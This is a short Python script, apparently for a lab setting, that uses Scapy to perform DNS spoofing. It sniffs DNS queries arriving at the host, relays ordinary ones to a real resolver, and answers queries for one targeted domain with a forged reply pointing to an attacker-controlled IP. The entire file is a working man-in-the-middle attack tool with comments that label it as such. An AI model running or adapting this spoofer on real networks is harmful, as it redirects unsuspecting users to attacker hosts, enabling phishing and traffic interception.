from scapy.all import *

IFACE = conf.iface
QUERY = 0
RESPONSE = 1

my_own_ip = get_if_addr(IFACE)

# Server Flags
DNS_SERVER = "192.168.122.1"

# Attacker Flags
MALICIOUS_SITE = b"www.example.com."
MALICIOUS_IP = "192.168.2.100"


def dns_pkt_filter(pkt):
	""" Filters the incoming sniffed packet and parse to dns_reply """
	try:
		if pkt[IP].dst == my_own_ip and pkt.haslayer(DNS):
			return pkt[UDP].dport == 53 and pkt[DNS].qr == QUERY

		return False

	except:
		pass


def dns_reply(pkt):
	""" Reply the client with the Fake DNS Reply """
	
	# Retrieve the DNS Question Name
	qname = pkt[DNSQR].qname
	
	# Let user browse through normal traffic
	if qname != MALICIOUS_SITE:
		dns_req = IP(dst=DNS_SERVER) \
				/ UDP(dport=53) \
				/ DNS(rd=1, qd=DNSQR(qname=qname))
		
		ans = sr1(dns_req, verbose=0)
		domain_ip = ans[DNSRR].rdata
	
	# User tries to access the site we want to spoof
	else:
		domain_ip = MALICIOUS_IP
	
	spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) \
				/ UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) \
				/ DNS(id=pkt[DNS].id, \
					qr=RESPONSE, \
					qd=pkt[DNS].qd, \
					an=DNSRR(rrname=qname, type='A', ttl=124, rdata=domain_ip), \
					ancount=1)

	send(spoofed_pkt)


def main():
	sniff(lfilter=dns_pkt_filter, prn=dns_reply, iface=IFACE)


if __name__ == '__main__':
	main()